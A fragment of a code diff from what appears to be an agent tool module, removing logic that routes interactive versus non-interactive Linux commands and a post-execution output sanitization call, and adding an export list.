-            if first in interactive_bins:
-                return True
-            lowered = cmd.lower()
-            if ' -i' in lowered or ' -it' in lowered:
-                return True
-            if 'tail -f' in lowered or 'journalctl -f' in lowered or 'watch ' in lowered:
-                return True
-            return False
-
-        if interactive and _looks_interactive(command):
-            result = run_command(
-                command,
-                ctf=None,
-                stdout=False,
-                async_mode=True,
-                session_id=None,
-                timeout=timeout,
-                stream=stream,
-                call_id=call_id,
-                tool_name="generic_linux_command",
-            )
-        else:
-            result = await run_command_async(
-                command,
-                ctf=None,
-                stdout=False,
-                async_mode=False,
-                session_id=None,
-                timeout=timeout,
-                stream=stream,
-                call_id=call_id,
-                tool_name="generic_linux_command",
-            )
-    
-    # Post-execution sanitization delegated to validation module
-    if isinstance(result, str):
-        result = validation.sanitize_tool_output(command, result)
-    
-    return result
 
 @function_tool
 def null_tool() -> str:
-    """
-    This is a null tool that does nothing.
-    NEVER USE THIS TOOL
-    """
     return "Null tool"
+
+
+__all__ = ["SemanticError", "PathGuard", "CerebroLinuxCommandTool", "LINUX_COMMAND_TOOL", "generic_linux_command", "null_tool"]
